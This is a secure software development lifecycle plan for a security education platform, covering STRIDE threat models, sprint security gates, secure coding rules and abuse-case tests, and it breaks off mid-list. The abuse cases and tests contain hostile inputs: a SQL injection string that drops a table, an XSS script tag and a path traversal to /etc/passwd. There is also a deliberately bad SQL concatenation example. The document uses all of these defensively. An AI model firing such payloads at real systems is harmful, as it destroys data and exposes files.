# SecureVision 2026 — SSDLC Analysis

**Version:** 1.0  
**Date:** 2026-07-06  
**Document type:** Secure Software Development Lifecycle (SSDLC) analysis  
**Scope:** Full lifecycle analysis of the SecureVision 2026 application as defined in `PLAN.md`, `requirements.md`, and `user_stories+tests.md`  
**Methodology:** Agile (Scrum + Kanban hybrid) with SSDLC security gates at each phase

---

## Executive Summary

SecureVision 2026 is a security education platform that teaches developers and architects about OWASP, MITRE ATLAS, CompTIA Security+, and SecAI+ threats. This creates a unique dual obligation:

1. **The application teaches security** — its content must be accurate, current, and trustworthy.
2. **The application must practice what it teaches** — it must itself be secure against every category of vulnerability it documents.

An application about SQL Injection that is itself vulnerable to SQL Injection is not just ironic — it is dangerous, because it trains developers with a false sense of authority. This SSDLC analysis ensures that every security principle the application teaches is also enforced during its own construction.

The lifecycle follows **Agile Scrum with a Kanban security gate overlay**. Security is not a phase — it is a continuous activity present in every sprint ceremony, every pull request, and every deployment pipeline.

---

## SSDLC vs SDLC — Key Distinction for This Project

```
Classic SDLC:
  Plan → Design → Code → Test → Deploy → Maintain
             ↑
         Security is added HERE (at testing phase) — TOO LATE

SSDLC (Shift Left):
  Secure   Secure   Secure    Secure     Secure    Secure
  Plan  →  Design → Code   → Test    → Deploy  → Maintain
    ↑         ↑       ↑         ↑          ↑         ↑
  Threat    Arch    SAST/    DAST/Pen   Hardened  Runtime
  Modeling  Review  Lint     Testing    Config    Monitoring
```

The "Shift Left" principle — which is one of the three game modes in the Security Architects board game that this application documents — is the core principle of this SSDLC. Security moves left on the timeline, from deployment toward planning.

---

## Agile Framework: Scrum + Kanban Hybrid

### Scrum Structure

```
Sprint length:   2 weeks
Team size:       3–5 developers (recommended for this project scope)
Velocity target: ~20 story points per sprint

Sprint ceremonies:
  Sprint Planning    — Monday,  Day 1,  2h max
  Daily Standup      — Daily,   15 min
  Sprint Review      — Friday,  Day 10, 1h
  Sprint Retrospective — Friday, Day 10, 45 min (security retro item required)
  Security Gate Review — Wednesday, Day 7, 30 min (mid-sprint security check)
```

### Kanban Board Columns (Security Gate Overlay)

```
BACKLOG → SPRINT → IN DEV → SEC REVIEW → TEST → DONE

Column definitions:
  BACKLOG        — Product Backlog items (threats, features, bugs)
  SPRINT         — Committed to current sprint (Sprint Backlog)
  IN DEV         — Developer is actively coding
  SEC REVIEW     — Peer security code review (mandatory gate)
                   Checklist: OWASP Top 10, input validation, SQL parameterization,
                   auth checks, no hardcoded secrets, proper logging
  TEST           — Unit + integration + component tests running
  DONE           — Meets Definition of Done (see below)

WIP Limits:
  IN DEV:       max 2 items per developer
  SEC REVIEW:   max 3 items total (prevents security review bottleneck)
  TEST:         max 5 items total
```

### Definition of Done (DoD) — Security Enforced

Every user story and task MUST meet ALL of these criteria before moving to DONE:

```
CODE QUALITY
  [ ] All unit tests pass (mvn test / vitest run)
  [ ] Code coverage ≥ 80% for changed service classes
  [ ] No SonarQube issues rated BLOCKER or CRITICAL
  [ ] No SpotBugs HIGH or MEDIUM security bugs

SECURITY GATES
  [ ] SAST scan passed (zero high-severity findings)
  [ ] OWASP Dependency Check: no CVEs rated CVSS ≥ 7.0 in dependencies
  [ ] Peer security code review completed (second developer sign-off)
  [ ] No secrets committed (git-secrets / trufflehog pre-commit hook passed)
  [ ] All SQL queries use JPA/parameterized statements (grep check)
  [ ] Input validation present for all new API parameters

DOCUMENTATION
  [ ] OpenAPI spec updated if new endpoints were added
  [ ] Threat model updated if new attack surface was introduced

TESTING
  [ ] Integration tests pass with Testcontainers
  [ ] Related E2E test passes (Playwright)
  [ ] No regressions in existing tests
```

### Sprint Map — All 31 Weeks (US-01–US-18)

```
-- FAZA BAZOWA (US-01–US-11) --
Sprint 0  (Week 0)      — SSDLC setup: threat model, security tools, CI/CD skeleton
Sprint 1  (Weeks 1–2)   — US-01–03: Foundation skeleton + DB schema + Framework catalog
Sprint 2  (Weeks 3–4)   — US-04–06: Data seeding + basic REST API + ThreatDetail page
Sprint 3  (Weeks 5–6)   — US-05–07: Threat filter API + STRIDE heatmap + CSV export
Sprint 4  (Weeks 7–8)   — US-04–05: ThreatDetail + CodeSamplePanel (Python + Java)
Sprint 5  (Weeks 9–10)  — US-09–10: All code samples (Go + Scala + Lua)
Sprint 6  (Weeks 11–12) — US-08: MITRE Kill Chain timeline + US-06: global search
Sprint 7  (Weeks 13–14) — US-07: Cross-reference matrix + STRIDE heatmap (US-05)
Sprint 8  (Week 15)     — US-11: i18n pl/en + full test pass + security hardening

-- ROZSZERZENIE CORNUCOPIA (US-12–US-18) --
Sprint 9  (Weeks 16–17) — US-12: FRE cards (Frontend security) + US-13: LLM cards
Sprint 10 (Weeks 18–19) — US-14: AAI cards (Agentic AI) + US-15: STRIDE EoP full catalogue
Sprint 11 (Weeks 20–21) — US-16: MLSec cards (EMR/EIR/EOR/EDR) + MITRE ATLAS refs
Sprint 12 (Weeks 22–23) — US-17: Mobile MAS cards (MASVS) + web-vs-mobile comparison matrix
Sprint 13 (Weeks 24–25) — US-18: DevOps DVO cards + BOT automated threats
Sprint 14 (Weeks 26–27) — Integracja: cross-reference matrices wszystkich suit + LLM×Agentic matrix
Sprint 15 (Weeks 28–29) — Pełna kampania testów bezpieczeństwa: DAST full scan + abuse cases AC-09–AC-13
Sprint 16 (Weeks 30–31) — Hardening produkcyjny dla treści kart + content integrity pipeline + release
```

---

## Phase 0 — Sprint Zero: SSDLC Setup

**Before a single line of production code is written**, Sprint 0 establishes the security infrastructure that will enforce security throughout the lifecycle. This sprint produces no application features — only tooling and governance.

### 0.1 Threat Modeling Session

Run a formal threat modeling workshop using the STRIDE methodology (directly aligned with the content the application teaches).

**Input:** Architecture diagram from PLAN.md Section 3  
**Method:** STRIDE per component + MITRE ATT&CK for context  
**Output:** Threat model document (`threat_model.md`)

```
Components to threat-model:
  1. Nginx reverse proxy
  2. Spring Boot REST API
  3. PostgreSQL database
  4. Redis cache
  5. React SPA (browser)
  6. JWT authentication layer
  7. CSV/PDF export endpoint
  8. Full-text search endpoint
  9. Admin data management endpoints
  10. Code sample content (displayed to users)

STRIDE analysis per component example — Spring Boot REST API:

  S (Spoofing):
    Threat: Attacker replays a stolen JWT token
    Mitigation: Short token TTL (15 min), refresh token rotation,
                token blacklist in Redis on logout

  T (Tampering):
    Threat: Attacker sends crafted JSON to modify threat data
    Mitigation: Bean Validation on all DTOs, admin-only write endpoints,
                audit logging of all data changes

  R (Repudiation):
    Threat: Admin modifies threat data and denies it
    Mitigation: Immutable audit log table (append-only), MDC logging with user ID

  I (Information Disclosure):
    Threat: Error response leaks stack trace and DB schema
    Mitigation: GlobalExceptionHandler returns only error codes,
                no stack traces in production responses

  D (Denial of Service):
    Threat: Flood of expensive full-text search queries
    Mitigation: Rate limiting (Bucket4j), Redis cache for frequent queries,
                query complexity limit (max 3 STRIDE filters simultaneously)

  E (Elevation of Privilege):
    Threat: Regular user accesses /api/admin/* endpoints
    Mitigation: Spring Security @PreAuthorize("hasRole('ADMIN')"),
                method-level security on all write operations
```

**Residual risk register entries:**

| Threat ID | Component | STRIDE | Severity | Mitigation | Residual Risk |
|---|---|---|---|---|---|
| TR-01 | JWT layer | S | HIGH | Short TTL + Redis blacklist | LOW |
| TR-02 | Search API | D | MEDIUM | Rate limit + cache | LOW |
| TR-03 | Admin API | E | HIGH | RBAC + method security | LOW |
| TR-04 | Error handling | I | MEDIUM | GlobalExceptionHandler | LOW |
| TR-05 | Code sample display | T | LOW | Markdown sanitization (DOMPurify) | INFO |
| TR-06 | CSV export | I | MEDIUM | Auth required, filename sanitized | LOW |
| TR-07 | PostgreSQL | T | HIGH | Parameterized queries only | LOW |
| TR-08 | Redis cache | I | MEDIUM | Redis AUTH + no sensitive data cached | LOW |

### 0.2 Security Tooling Setup

Install and configure all security tools BEFORE first commit:

```bash
# 1. Pre-commit hooks (run on every git commit)
pip install pre-commit
cat .pre-commit-config.yaml:
  - repo: https://github.com/gitleaks/gitleaks
    hooks: [gitleaks]               # detect secrets
  - repo: https://github.com/trufflesecurity/trufflehog
    hooks: [trufflehog]             # detect secrets (second pass)
  - repo: local
    hooks:
      - id: no-string-concat-sql
        entry: grep -rn '\"SELECT\|\"UPDATE\|\"DELETE\|\"INSERT' src/main/java
        language: system
        pass_filenames: false        # catch SQL string concat

# 2. Backend SAST
# Add to pom.xml:
#   SpotBugs + FindSecBugs plugin (runs on mvn verify)
#   OWASP Dependency Check plugin (runs on mvn verify)
#   SonarQube scanner

# 3. Frontend SAST
npm install --save-dev eslint-plugin-security
#   Add to .eslintrc: "plugin:security/recommended"
npm install --save-dev @microsoft/eslint-plugin-sdl
#   Catches XSS, unsafe innerHTML, etc.

# 4. Container scanning
# Add to CI: trivy image securevision-backend:latest

# 5. DAST (runs post-deploy in staging)
# OWASP ZAP Docker image in CI: ghcr.io/zaproxy/zaproxy:stable
```

### 0.3 Branch Protection & CI Gates

```
GitHub Branch Protection Rules for 'main':
  ✓ Require pull request (min 1 reviewer with security-review label)
  ✓ Require status checks:
      - backend-unit-tests
      - backend-integration-tests
      - sast-spotbugs
      - sast-dependency-check
      - frontend-vitest
      - docker-build
  ✓ No force push
  ✓ Require linear history
  ✓ Dismiss stale reviews on new push
```

---

## Phase 1 — Planning & Analysis (Secure Requirements)

**Scrum mapping:** Sprint 0 (continuation) + Sprint 1 setup  
**SSDLC activity:** Secure requirements elicitation, compliance mapping, abuse case creation

### 1.1 Business Goals vs Security Constraints

| Business Goal | Security Constraint | SSDLC Enforcement |
|---|---|---|
| Show real attack code examples | Must not be weaponizable | Attack demos isolated in read-only DB, labeled VULNERABLE, never executed server-side |
| Public read access to threat data | Must prevent data tampering | All write operations JWT-protected; read-only DB role for the application |
| Export to CSV | Must prevent path traversal and injection | Filename sanitized, `Content-Disposition` header, no user-controlled path |
| Admin can add new threats | Must prevent stored XSS in code samples | Markdown rendered server-side via Commonmark with HTML sanitization |
| Teach OWASP LLM Top 10 | The app itself must not exhibit those vulnerabilities | Each LLM vulnerability is checked against the app's own architecture in threat model |

### 1.2 Compliance Requirements Mapping

| Regulation | Applicable | Impact on This Project |
|---|---|---|
| OWASP ASVS Level 2 | YES | Authentication, session, input validation requirements |
| NIS2 / UKSC (EU) | Depends on deployment | If hosted commercially: incident reporting within 24h, MFA, supply chain checks |
| GDPR | YES (if users register) | No PII collected beyond admin email; JWT contains only user ID + role |
| NIST AI RMF | Educational reference | App documents this framework; does not itself deploy an AI model |
| CWE Top 25 | YES | Checked by SpotBugs/FindSecBugs at every build |

### 1.3 Security Requirements Traceability Matrix

Each functional requirement from `requirements.md` is linked to a security control:

| Req ID | Requirement | Threat (STRIDE) | Security Control |
|---|---|---|---|
| FR-02.5 | Full-text search (live) | D — DoS via complex queries | Rate limiting: max 10 req/min per IP (Bucket4j) |
| FR-05.2 | Display attack demo code | T — Stored XSS in rendered code | DOMPurify sanitization; `<pre>` blocks, no `innerHTML` |
| FR-09 | Global search | I — Information leakage via search | Search only over public fields; no admin-only data in search index |
| FR-10.1 | CSV export | I — Data exfiltration | Auth required for bulk export; rate limited |
| FR-12 | Admin CRUD | E — Privilege escalation | `@PreAuthorize("hasRole('ADMIN')")` on all write endpoints |
| NFR-02.6 | No secrets in repo | I — Credential exposure | Pre-commit gitleaks hook; `.env` not committed |

### 1.4 Abuse Cases (Negative User Stories)

Alongside regular user stories, SSDLC requires **abuse cases** — "misuse stories" written from the attacker's perspective. These drive negative test cases.

```
AC-01: As an attacker, I try to inject SQL via the search query parameter
       ?q='; DROP TABLE threats; --
       Expected: 400 Bad Request, no DB modification, SQL injection attempt logged

AC-02: As an attacker, I try to access /api/admin/threats with a forged or expired JWT
       Expected: 401 Unauthorized, attempt logged with IP address

AC-03: As an attacker, I submit a threat title with <script>alert(1)</script>
       via the admin API to store XSS in the DB
       Expected: Input rejected with 400 (validation) OR sanitized before storage

AC-04: As an attacker, I flood /api/search with 1000 req/min from the same IP
       Expected: 429 Too Many Requests after limit; no DB overload

AC-05: As an attacker, I request /api/threats/export?framework=../../etc/passwd
       (path traversal attempt)
       Expected: 400 Bad Request; no file system access

AC-06: As an attacker, I submit a code sample snippet containing
       a JavaScript XSS payload to be displayed to other users
       Expected: Code is rendered as plain text inside <pre>, not executed

AC-07: As an attacker, I enumerate all user IDs via /api/bookmarks/{id}
       (IDOR — Insecure Direct Object Reference, OWASP A01)
       Expected: Bookmarks are tied to localStorage only; no server-side user ID exposure

AC-08: As an attacker, I attempt to access /api/threats/{id}/code-samples
       for a non-existent threat ID to trigger a verbose 500 error
       Expected: 404 with generic message, no stack trace
```

**Abuse cases become test cases** — each AC above has a corresponding `@Test` in the integration test suite.

---

## Phase 2 — Secure Design

**Scrum mapping:** Sprint 1 (architecture decisions locked before coding starts)  
**SSDLC activity:** Security architecture review, data flow analysis, trust boundary definition

### 2.1 Trust Boundaries

Every point where data crosses a trust boundary is a potential attack surface. The diagram below maps trust zones:

```
ZONE 0 — Internet (untrusted)
│
│ HTTPS (TLS 1.3 minimum)
▼
ZONE 1 — DMZ: Nginx reverse proxy
│   Controls: rate limiting, TLS termination, request size limits (max 100KB)
│   CSP header, HSTS header
│
│ HTTP (internal Docker network only)
▼
ZONE 2 — Application: Spring Boot
│   Controls: JWT validation, input validation (Bean Validation),
│             Spring Security method-level auth
│   Trust: trusts PostgreSQL and Redis within the same Docker network
│
├─── ZONE 3a — PostgreSQL (read/write via JPA)
│         Controls: application uses a DB user with SELECT only on read paths,
│                   a separate DB user with INSERT/UPDATE for admin paths
│                   No direct internet access
│
└─── ZONE 3b — Redis cache (session data)
          Controls: Redis AUTH password set, no sensitive data (only cache keys),
                    TTL on all keys
```

### 2.2 Principle of Least Privilege — Applied to Data Model

The application exposes the same data in different contexts. Access is scoped:

| Operation | DB Role | Spring Security Role | JWT Required |
|---|---|---|---|
| Read frameworks list | `sv_reader` (SELECT only) | Anonymous | No |
| Read threat detail | `sv_reader` | Anonymous | No |
| Read code samples | `sv_reader` | Anonymous | No |
| Search threats | `sv_reader` | Anonymous | No |
| Export CSV (bulk) | `sv_reader` | `USER` | Yes |
| Create/Update threat | `sv_writer` | `ADMIN` | Yes |
| Delete threat | `sv_writer` | `ADMIN` | Yes |
| Create code sample | `sv_writer` | `ADMIN` | Yes |

This mirrors the OWASP A01 (Broken Access Control) mitigation that the app itself teaches.

### 2.3 Secure API Design Decisions

Decisions made at design time that prevent vulnerabilities later:

```
Decision D-01: Pagination on all list endpoints
  Rationale: Prevents DoS via unbounded result sets (LLM10 — Unbounded Consumption)
  Implementation: Spring Data Pageable, max page size = 100

Decision D-02: ID strategy — UUIDs, not sequential integers
  Rationale: Prevents IDOR enumeration (OWASP A01)
  Implementation: @GeneratedValue(strategy = UUID) in JPA entities

Decision D-03: Separate DB users for read vs write
  Rationale: If the application is compromised, an attacker cannot write
             (principle of least privilege — OWASP A01)
  Implementation: Two datasources in application.yml (DataSource routing)

Decision D-04: No raw SQL — JPA Criteria API or JPQL only
  Rationale: Prevents SQL Injection (OWASP A03)
  Implementation: Enforced by CI grep check (no 'nativeQuery = true' without review)

Decision D-05: Markdown rendering happens in the backend, not the browser
  Rationale: Server-side sanitization is more reliable (Commonmark + Owasp Java HTML Sanitizer)
  Implementation: ThreatDto.description is pre-rendered HTML, sanitized, served as string

Decision D-06: Code sample snippets are never eval'd or executed
  Rationale: Application displays code for reading, not running; XSS vector if innerHTML used
  Implementation: React uses <code> with textContent assignment, not dangerouslySetInnerHTML

Decision D-07: JWT stored in httpOnly cookie, not localStorage
  Rationale: Prevents XSS token theft (OWASP A07)
  Implementation: Spring Security sets HttpOnly + Secure + SameSite=Strict cookie

Decision D-08: Admin endpoints on separate URL prefix with IP allowlist in Nginx
  Rationale: Defense in depth for privilege escalation (OWASP A01, TR-03)
  Implementation: Nginx location /api/admin/ { allow 10.0.0.0/8; deny all; }
```

### 2.4 STRIDE Analysis of the Designed Architecture

Applied to each component defined in PLAN.md Section 3:

#### 2.4.1 Nginx Reverse Proxy

| STRIDE | Threat | Control |
|---|---|---|
| S | Attacker spoofs X-Forwarded-For header | `real_ip_header X-Real-IP;` — trust only the upstream load balancer |
| T | HTTP request smuggling via conflicting headers | `proxy_request_buffering on;` + keep-alive disabled between Nginx and Spring |
| R | Log tampering post-incident | Logs written to append-only log aggregation (e.g., Loki) |
| I | TLS downgrade attack | `ssl_protocols TLSv1.3;` — no TLS 1.0/1.1/1.2 |
| D | Slowloris DoS attack | `client_header_timeout 10s; client_body_timeout 10s;` |
| E | Nginx running as root | `user nginx;` — non-root user; Docker: `--user 1000:1000` |

#### 2.4.2 Spring Boot Application

| STRIDE | Threat | Control |
|---|---|---|
| S | JWT token replay after logout | Token blacklist in Redis; logout endpoint invalidates token |
| T | Mass assignment via Jackson deserialization | `@JsonIgnoreProperties(ignoreUnknown = true)` + explicit DTOs, never `@RequestBody Entity` |
| R | Admin denies deleting a threat | Audit log: `AuditEvent(userId, action, entityId, timestamp)` — append-only |
| I | Exception leaking internal details | `@ControllerAdvice` returning `ProblemDetail` (RFC 9457), no stack traces |
| D | Search API resource exhaustion | Bucket4j rate limiter: 20 search requests/min per IP |
| E | Spring Actuator endpoints exposed | `management.endpoints.web.exposure.include=health,info` only; `/actuator/env` disabled |

#### 2.4.3 PostgreSQL Database

| STRIDE | Threat | Control |
|---|---|---|
| S | Application connects with superuser account | Dedicated `sv_reader` / `sv_writer` roles, no superuser |
| T | Direct DB modification bypasses audit | Application is the only entry point; DB port not exposed outside Docker network |
| R | DB admin runs DELETE without logging | `pg_audit` extension enabled for DDL and write operations |
| I | Column-level sensitive data exposure | No PII stored beyond admin email (hashed in logs) |
| D | Large query consuming all DB memory | `statement_timeout = 5000` (5s) in PostgreSQL config |
| E | SQL injection via dynamic query construction | JPA/JPQL only; `nativeQuery = true` requires security review approval |

#### 2.4.4 React SPA (Browser)

| STRIDE | Threat | Control |
|---|---|---|
| S | Attacker intercepts JWT in transit | HttpOnly cookie + HTTPS enforced |
| T | Attacker modifies displayed code samples via DOM | No `dangerouslySetInnerHTML`; code blocks use `textContent` |
| R | User disputes a code sample was shown (content integrity) | Code samples served from DB with version hash; unchangeable by users |
| I | Sensitive data leaked via browser DevTools | No tokens in localStorage or sessionStorage; console.log stripped in production build |
| D | Client-side render blocking on large result sets | Paginated API (max 50 threats per page), React.lazy for heavy components |
| E | User modifies their JWT in the cookie manually | JWT signature validation on every request in Spring Security |

### 2.5 Data Classification

```
CONFIDENTIAL (never logged, never in error responses, never in client-side storage):
  - JWT secret key
  - Database passwords
  - Admin user credentials

INTERNAL (shown to authenticated admin users only):
  - Audit log entries
  - System error details

PUBLIC (shown to all users, no authentication required):
  - All framework data
  - All threat data
  - All mitigation data
  - All code samples
  - Search results
```

---

## Phase 3 — Implementation (Secure Coding)

**Scrum mapping:** Sprints 1–7  
**SSDLC activity:** Secure coding standards, peer review, automated SAST on every push

### 3.1 Secure Coding Standards — Java (Spring Boot)

These rules are enforced by SpotBugs + FindSecBugs (automated) and peer review (human).

```java
// RULE J-01: Never concatenate SQL — use JPA/JPQL
// BAD (triggers FindSecBugs SQL_INJECTION_SPRING_JDBC):
String query = "SELECT * FROM threats WHERE code = '" + code + "'";
jdbcTemplate.query(query, ...);

// GOOD:
@Query("SELECT t FROM Threat t WHERE t.code = :code")
Optional<Threat> findByCode(@Param("code") String code);

// RULE J-02: Always use @Valid on @RequestBody parameters
// BAD:
@PostMapping("/threats")
public ResponseEntity<ThreatDto> create(@RequestBody CreateThreatRequest req) { ... }

// GOOD:
@PostMapping("/threats")
public ResponseEntity<ThreatDto> create(@Valid @RequestBody CreateThreatRequest req) { ... }

// RULE J-03: Never expose entity classes in responses — always use DTOs
// BAD: @GetMapping returns Threat entity (exposes JPA internals, DB IDs)
// GOOD: @GetMapping returns ThreatDto (explicit field control)

// RULE J-04: Log security events, not data
// BAD: log.info("User {} logged in with password {}", username, password);
// GOOD: log.info("AUTH_SUCCESS user={}", userId);  // MDC context only

// RULE J-05: Exception handling — never expose internal details
@ControllerAdvice
public class GlobalExceptionHandler {
    @ExceptionHandler(Exception.class)
    public ProblemDetail handleAll(Exception ex, HttpServletRequest req) {
        // Log full exception internally with correlation ID
        String correlationId = UUID.randomUUID().toString();
        log.error("UNHANDLED_EXCEPTION correlationId={}", correlationId, ex);
        // Return only correlation ID to client — no stack trace
        ProblemDetail pd = ProblemDetail.forStatus(500);
        pd.setDetail("Internal error. Reference: " + correlationId);
        return pd;
    }
}

// RULE J-06: Parameterize all external inputs — including framework code filter
// BAD: The framework code from query param is passed directly to a LIKE clause
// GOOD: Validate against an enum before any DB interaction
public enum FrameworkCode {
    OWASP_WEB, OWASP_LLM, OWASP_API, MITRE_ATLAS, COMPTIA_SY0701, COMPTIA_SECAI;
    public static FrameworkCode fromString(String value) {
        return Arrays.stream(values())
            .filter(v -> v.name().equalsIgnoreCase(value))
            .findFirst()
            .orElseThrow(() -> new InvalidParameterException("Unknown framework: " + value));
    }
}
```

### 3.2 Secure Coding Standards — TypeScript / React

```typescript
// RULE R-01: Never use dangerouslySetInnerHTML for code samples
// BAD:
<div dangerouslySetInnerHTML={{ __html: codeSample.snippet }} />

// GOOD (code is treated as text, syntax highlighter operates on textContent):
<pre ref={ref => { if (ref) ref.textContent = codeSample.snippet }}>
  <code className={`language-${lang}`} />
</pre>

// RULE R-02: Sanitize rendered Markdown (threat descriptions come pre-sanitized
// from server, but re-sanitize client-side as defense-in-depth)
import DOMPurify from 'dompurify'
const safeHtml = DOMPurify.sanitize(threatDto.descriptionHtml, {
  ALLOWED_TAGS: ['p', 'strong', 'em', 'ul', 'ol', 'li', 'code', 'pre', 'a'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  FORCE_BODY: true
})

// RULE R-03: External links open with rel="noopener noreferrer"
<a href={framework.referenceUrl} target="_blank" rel="noopener noreferrer">
  Official docs
</a>

// RULE R-04: Never store JWT or auth tokens in localStorage or sessionStorage
// JWT is in HttpOnly cookie managed by the browser — React code never touches it

// RULE R-05: Validate API response shapes before rendering (Zod)
import { z } from 'zod'
const ThreatSchema = z.object({
  id: z.string().uuid(),
  code: z.string().min(2).max(20),
  severity: z.enum(['CRITICAL','HIGH','MEDIUM','LOW','INFO']),
  // ...
})
// If backend returns unexpected shape, Zod throws before React renders it
const threat = ThreatSchema.parse(apiResponse)
```

### 3.3 Sprint-by-Sprint Security Activities

#### Sprint 1 — Foundation

```
Security activities during this sprint:
  Day 1:  Create Flyway migration files — reviewed for SQL injection before merge
  Day 3:  Spring Security configuration written — peer reviewed
  Day 5:  SecurityConfig test: verify /api/admin/* returns 401 without JWT
  Day 7:  (Security Gate Review) Confirm: DB uses two separate roles (reader/writer)
           Confirm: no secrets in application.yml (env variable references only)
  Day 10: DoD check: OWASP Dependency Check passes with 0 CVEs ≥ 7.0
```

#### Sprint 2 — Data Seeding + Basic REST API

```
Security activities:
  Day 1:  Abuse case AC-01 (SQL injection via search) converted to integration test
           — test is written (RED), then ThreatService is implemented (GREEN)
  Day 3:  Abuse case AC-08 (verbose 500 error) — GlobalExceptionHandler written
  Day 5:  All endpoints return ProblemDetail (RFC 9457), not raw Java exceptions
  Day 7:  (Security Gate Review) Check: are all GET endpoints returning paginated responses?
           Check: does the framework filter validate against FrameworkCode enum?
  Day 10: SpotBugs scan — zero HIGH findings required before sprint close
```

#### Sprint 3 — Threat Filter API + React ThreatList

```
Security activities:
  Day 1:  eslint-plugin-security added to frontend; first run on ThreatList.tsx
  Day 3:  Rate limiting added to /api/search (Bucket4j — 20 req/min per IP)
  Day 5:  XSS test: attempt to render <script> in a threat card — verify it is escaped
  Day 7:  (Security Gate Review) Confirm: React does not use dangerouslySetInnerHTML
           in any component written this sprint
  Day 10: Zod schema validation added to all API response types
```

#### Sprint 4 — ThreatDetail + CodeSamplePanel

```
Security activities:
  Day 1:  Attack demo code block styling: red border class added,
           "VULNERABLE" warning label — confirmed in component test
  Day 3:  DOMPurify integrated for markdown-rendered threat descriptions
  Day 5:  Clipboard API permission handling — no fallback that touches the DOM unsafely
  Day 7:  (Security Gate Review) Confirm: code sample display uses textContent, not innerHTML
           Confirm: copy-to-clipboard does not execute any code sample content
  Day 10: SAST: eslint-plugin-sdl — 0 warnings in CodeSamplePanel.tsx
```

---

## Phase 4 — Security Testing

**Scrum mapping:** Continuous across all sprints; final hardening in Sprint 8  
**SSDLC activity:** SAST, DAST, SCA, penetration testing, abuse case testing

### 4.1 Test Pyramid with Security Layers

```
            ┌───────────────────────┐
            │  Penetration Testing  │  Manual — Sprint 8 only
            │  (OWASP ZAP Active)   │
            ├───────────────────────┤
            │  DAST (ZAP Baseline)  │  Every CI build on staging
            │  E2E Security Tests   │  Playwright — 10 abuse cases
            ├───────────────────────┤
            │  Integration Tests    │  Testcontainers — every PR
            │  + Abuse Case Tests   │  AC-01 through AC-08
            ├───────────────────────┤
            │  Unit Tests           │  JUnit 5 + Vitest — every commit
            │  + SAST (SpotBugs)    │  Automated on every push
            ├───────────────────────┤
            │  Pre-commit Hooks     │  gitleaks + trufflehog — every commit
            │  (Secrets + SQL lint) │
            └───────────────────────┘
```

### 4.2 SAST — Static Application Security Testing

#### Backend: SpotBugs + FindSecBugs

```xml
<!-- pom.xml — runs automatically on mvn verify -->
<plugin>
  <groupId>com.github.spotbugs</groupId>
  <artifactId>spotbugs-maven-plugin</artifactId>
  <version>4.8.x</version>
  <configuration>
    <plugins>
      <plugin>
        <groupId>com.h3xstream.findsecbugs</groupId>
        <artifactId>findsecbugs-plugin</artifactId>
        <version>1.13.x</version>
      </plugin>
    </plugins>
    <failOnError>true</failOnError>
    <threshold>Medium</threshold>
  </configuration>
</plugin>
```

FindSecBugs detects (relevant to this project):
- `SQL_INJECTION_JPA` — parameterized queries check
- `XSS_REQUEST_PARAMETER_TO_SEND_ERROR` — error response XSS
- `HARD_CODE_PASSWORD` — secrets in source code
- `TRUST_BOUNDARY_VIOLATION` — unvalidated user input flows to sensitive operation
- `SPRING_UNVALIDATED_REDIRECT` — open redirects

#### Frontend: ESLint Security Plugins

```json
// .eslintrc.json
{
  "extends": [
    "plugin:security/recommended",
    "plugin:@microsoft/sdl/react"
  ],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "warn",
    "@microsoft/sdl/no-inner-html": "error",
    "@microsoft/sdl/no-document-write": "error"
  }
}
```

#### SonarQube Quality Gate

```
Quality Gate definition (required to merge to main):
  Security Rating:       A (no security vulnerabilities)
  Reliability Rating:    A (no bugs)
  Security Hotspots:     0 unreviewed
  Coverage:              ≥ 80% on new code
  Duplicated Lines:      < 3%
```

### 4.3 SCA — Software Composition Analysis

```bash
# OWASP Dependency Check — backend
mvn org.owasp:dependency-check-maven:check
# Fails build if any dependency has CVSS score ≥ 7.0

# npm audit — frontend
npm audit --audit-level=high
# Fails CI if any HIGH or CRITICAL npm vulnerability exists

# Trivy — container image scanning
trivy image --exit-code 1 --severity HIGH,CRITICAL securevision-backend:latest
trivy image --exit-code 1 --severity HIGH,CRITICAL securevision-frontend:latest
```

**Review cadence:** SCA is run on every CI build. Separately, a weekly automated PR is created by Dependabot to update dependencies with known CVEs.

### 4.4 DAST — Dynamic Application Security Testing (OWASP ZAP)

Runs against the staging environment after every deployment:

```bash
# Baseline scan (passive only — every PR to main)
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py \
  -t http://staging.securevision.internal \
  -r zap-report.html \
  -I  # informational alerts do not fail the build

# Full active scan (Sprint 8 only — before production release)
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py \
  -t http://staging.securevision.internal \
  -r zap-full-report.html
```

ZAP checks relevant to this application:
- SQL Injection via query parameters (`?q=`, `?framework=`)
- XSS via search results display
- CSRF on admin endpoints
- Security headers (CSP, HSTS, X-Frame-Options)
- Information disclosure via error responses
- Path traversal via export filename parameter
- Sensitive data exposure in HTTP responses

### 4.5 Abuse Case Tests — Integration Level

These are the tests that map to the abuse cases defined in Phase 1:

```java
// AC-01: SQL Injection via search parameter
@Test
@DisplayName("AC-01: SQL injection via search query returns 400, no DB modification")
void search_sqlInjectionAttempt_returns400() {
    given().port(port)
        .queryParam("q", "'; DROP TABLE threats; --")
        .when().get("/api/search")
        .then().statusCode(400);

    // Verify threats table still exists
    assertThat(threatRepository.count()).isGreaterThan(0);
}

// AC-02: Admin endpoint without JWT returns 401
@Test
@DisplayName("AC-02: Admin endpoint without JWT returns 401")
void adminEndpoint_noJwt_returns401() {
    given().port(port)
        .when().post("/api/admin/threats")
        .then().statusCode(401);
}

// AC-04: Rate limiting kicks in after 20 rapid search requests
@Test
@DisplayName("AC-04: Rate limit enforced after 20 requests per minute")
void search_rateLimitExceeded_returns429() {
    for (int i = 0; i < 20; i++) {
        given().port(port).queryParam("q", "injection")
            .when().get("/api/search")
            .then().statusCode(200);
    }
    // 21st request should be rate limited
    given().port(port).queryParam("q", "injection")
        .when().get("/api/search")
        .then().statusCode(429)
        .header("Retry-After", notNullValue());
}

// AC-08: Non-existent threat ID returns 404 with no stack trace
@Test
@DisplayName("AC-08: Non-existent threat returns 404 without stack trace")
void getThreat_nonExistentId_returns404NoStackTrace() {
    var body = given().port(port)
        .when().get("/api/threats/{id}", UUID.randomUUID())
        .then().statusCode(404)
        .extract().body().asString();

    assertThat(body).doesNotContain("at com.securevision");
    assertThat(body).doesNotContain("NullPointerException");
    assertThat(body).doesNotContain("HibernateException");
}
```

### 4.6 Security Regression Testing

Every bug fix that involves a security issue MUST be accompanied by a regression test that was **written first (TDD — RED)** to reproduce the bug, and then the fix is applied (GREEN):

```
Process for security bug fixes:
  1. Create a Git branch: fix/sec-{CVE-or-description}
  2. Write a failing test that reproduces the vulnerability (RED)
